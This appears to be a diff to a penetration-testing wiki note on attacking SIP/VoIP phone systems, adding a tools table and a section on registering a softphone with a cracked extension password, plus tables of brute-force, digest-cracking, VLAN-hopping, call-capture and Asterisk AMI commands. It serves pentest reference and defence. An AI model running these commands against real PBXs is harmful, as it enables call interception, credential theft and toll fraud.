@@ -1,4 +1,6 @@
-#SIP #VoIP #telephony #SIPvicious #RTP #Asterisk #FreePBX #IVR
+# SIP-VoIP
+
+#SIP #VoIP #telephony #SIPvicious #RTP #Asterisk #FreePBX #IVR #networkmanagement
 
 ## What is SIP/VoIP?
 Session Initiation Protocol — signaling protocol for initiating, maintaining, and terminating real-time sessions (voice, video, messaging). Underpins enterprise telephone systems (PBX), UC platforms (Teams, Cisco UCM, Avaya, Asterisk/FreePBX). Attack surface: extension enumeration, credential brute force, eavesdropping, VLAN hopping, toll fraud, and web admin panel exploitation.
@@ -21,32 +23,21 @@ Session Initiation Protocol — signaling protocol for initiating, maintaining, 
 
 ## Tools
 
+| Tool | Use |
+|---|---|
+| [[Tools/Network/SIPVicious\|SIPVicious]] | Primary VoIP toolkit — `svmap` scan, `svwar` extension enum, `svcrack` password brute |
+| [[Tools/Network/sngrep\|sngrep]] | Live/pcap SIP flow monitor (TUI); export dialogs + RTP |
+| [[Tools/Network/voiphopper\|voiphopper]] | VoIP VLAN hopping via CDP/LLDP → sniff the voice VLAN |
+| [[Tools/Scanning/NMAP\|NMAP]] | `sip-methods`, `sip-enum-users` NSE on UDP 5060 |
+| [[Tools/Auth/Hydra\|Hydra]] | Brute SIP auth (`sip://`) as an alternative to svcrack |
+| [[Tools/Auth/hashcat\|hashcat]] | Crack captured SIP digest hashes (`-m 11400`) |
+| [[Tools/Network/wireshark\|wireshark]] | RTP stream capture + audio reconstruction (Telephony → VoIP Calls) |
+| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `auxiliary/voip/*`, Asterisk AMI + FreePBX exploit modules |
+
+Also used inline: `sipsak` (SIP swiss-army — OPTIONS/REGISTER over UDP/TCP/TLS), `sipcrack` (offline SIP digest cracker), `tcpdump`/`tshark` (capture + RFC 2833 DTMF extraction), `rtpdump`/`sox`/`multimon-ng`/`dtmf2num`/`ribt-dtmf-decoder` (RTP → audio → DTMF), `arpspoof` (on-path MiTM), `pjsua`/`baresip`/`linphonec` (softphone clients to register a stolen extension), `mysql` (FreePBX DB loot).
+
 ```bash
-# SIPVicious suite — primary VoIP pentest toolkit
-pip install sipvicious
-# or: apt install sipvicious
-
-# svmap    — SIP host/device scanner
-# svwar    — extension/user enumeration
-# svcrack  — SIP credential brute forcer
-# svreport — manage scan reports
-# svlearndb — manage DB results
-
-# sngrep — SIP traffic monitor/capture (TUI)
-apt install sngrep
-sngrep
-
-# sipsak — SIP swiss army knife
-apt install sipsak
-
-# nmap SIP scripts
-nmap -sU -p 5060 --script sip-enum-users,sip-methods host
-
-# Wireshark — RTP stream capture and audio reconstruction
-# Telephony → VoIP Calls → select call → Play Streams
-
-# Metasploit SIP modules
-search type:auxiliary sip
+nmap -sU -p 5060 --script sip-enum-users,sip-methods host   # quick fingerprint
 ```
 
 ---
@@ -127,6 +118,31 @@ done
 # Hydra (alternative)
 hydra -l 100 -P /usr/share/wordlists/rockyou.txt sip://<target>
 ```
+
+---
+
+## Connect / Access
+
+Once you have an extension + password (from `svcrack`, a captured digest, or a default), **register a softphone as that extension** — this is the foothold that toll fraud, call interception and outbound pivoting all depend on.
+
+```bash
+# pjsua (pjproject) — scriptable SIP CLI client
+pjsua --id="sip:200@<pbx>" --registrar="sip:<pbx>" \
+      --realm="*" --username=200 --password='<pass>'
+#   once REGISTERed, place a call:  in the pjsua console →  m  then  sip:<dest>@<pbx>
+
+# baresip — modern CLI softphone (accounts file: ~/.baresip/accounts)
+echo '<sip:200@<pbx>>;auth_pass=<pass>' >> ~/.baresip/accounts && baresip
+
+# linphonec — register + dial in one line
+linphonec
+> register sip:200@<pbx> <pass>
+> call sip:<dest>@<pbx>
+
+# Verify the registration took (server-side) via sngrep / a 200 OK to REGISTER
+```
+
+> A successful REGISTER as a real extension means the PBX now routes that extension's calls to *you* (interception) and accepts *your* outbound calls billed to it (toll fraud). Check the dialplan's outbound rules before dialling — see Toll Fraud below.
 
 ---
 
@@ -348,36 +364,6 @@ ls /var/spool/asterisk/recording/
 ```
 
 ---
-
-## Dangerous Settings
-
-| Setting | Risk |
-|---|---|
-| SIP on UDP 5060 without auth | Extension enumeration without credentials |
-| Weak extension passwords (= extension number) | Trivial brute force → toll fraud |
-| AMI exposed on network with default creds | Remote command execution |
-| No SRTP (unencrypted RTP) | Call eavesdropping |
-| No SIP TLS | Credential and signaling interception |
-| FreePBX admin UI exposed | Web-based RCE |
-| Permissive outbound dial rules | Toll fraud via compromised extension |
-| VoIP VLAN accessible from data VLAN | VLAN hop → call interception |
-
----
-
-## Quick Reference
-
-| Goal | Command |
-|---|---|
-| Scan for SIP | `svmap <target>` / `nmap -sU -p 5060 -sV target` |
-| Extension enum | `svwar -e100-999 <target>` |
-| Brute force ext | `svcrack -u 200 -d rockyou.txt <target>` |
-| Live SIP monitor | `sudo sngrep` |
-| Capture calls | `tcpdump -i eth0 -w calls.pcap udp port 5060 or udp portrange 10000-20000` |
-| Reconstruct audio | Wireshark → Telephony → VoIP Calls → Play Streams |
-| AMI connect | `nc host 5038` → `Action: Login` |
-| Crack SIP digest | `hashcat -m 11400 hashes.txt rockyou.txt` |
-| FreePBX config | `cat /etc/asterisk/sip.conf` |
-| VoIP VLAN hop | `voiphopper -i eth0 -c 0` |
 
 ---
 
@@ -612,3 +598,45 @@ sox -r 8000 -e a-law -c 1 rtp_payload.raw audio.wav   # G.711 alaw
 # Step 3: Decode
 python3 dtmf.py -v audio.wav
 ```
+
+---
+
+## Dangerous Settings
+
+| Setting | Risk |
+|---|---|
+| SIP on UDP 5060 without auth | Extension enumeration without credentials |
+| Weak extension passwords (= extension number) | Trivial brute force → toll fraud |
+| AMI exposed on network with default creds | Remote command execution |
+| No SRTP (unencrypted RTP) | Call eavesdropping |
+| No SIP TLS | Credential and signaling interception |
+| FreePBX admin UI exposed | Web-based RCE |
+| Permissive outbound dial rules | Toll fraud via compromised extension |
+| VoIP VLAN accessible from data VLAN | VLAN hop → call interception |
+
+---
+
+## Quick Reference
+
+| Goal | Command |
+|---|---|
+| Scan for SIP | `svmap <target>` / `nmap -sU -p 5060 -sV target` |
+| Extension enum | `svwar -e100-999 <target>` |
+| Brute force ext | `svcrack -u 200 -d rockyou.txt <target>` |
+| Live SIP monitor | `sudo sngrep` |
+| Capture calls | `tcpdump -i eth0 -w calls.pcap udp port 5060 or udp portrange 10000-20000` |
+| Reconstruct audio | Wireshark → Telephony → VoIP Calls → Play Streams |
+| AMI connect | `nc host 5038` → `Action: Login` |
+| Crack SIP digest | `hashcat -m 11400 hashes.txt rockyou.txt` |
+| FreePBX config | `cat /etc/asterisk/sip.conf` |
+| VoIP VLAN hop | `voiphopper -i eth0 -c 0` |
+
+---
+
+> [!note] **See also** — VLAN-hopping onto the voice VLAN overlaps [[Techniques/Network Device Pentesting|Network Device Pentesting]] (CDP/LLDP, switch attacks); RTP capture/DTMF work uses [[Tools/Network/wireshark|wireshark]] + [[Tools/Network/sngrep|sngrep]]; SIP digest hashes crack with [[Tools/Auth/hashcat|hashcat]] (`-m 11400`).
+
+---
+
+*Created: 2026-07-13*
+*Updated: 2026-09-23*
+*Model: claude-opus-4-8*
